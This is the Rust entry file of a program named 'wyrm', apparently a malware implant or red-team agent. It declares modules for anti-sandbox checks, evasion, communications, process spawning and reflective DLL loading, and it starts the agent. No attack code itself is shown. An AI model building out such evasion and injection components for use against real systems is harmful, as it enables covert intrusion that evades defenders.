#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

#[global_allocator]
static GLOBAL_ALLOC: ProcessHeapAlloc = ProcessHeapAlloc;

use entry::start_wyrm;

use crate::utils::allocate::ProcessHeapAlloc;

mod anti_sandbox;
mod comms;
mod entry;
mod evasion;
mod execute;
mod native;
mod rdi_loader;
mod spawn;
mod utils;
mod wyrm;

fn main() {
    start_wyrm();
}
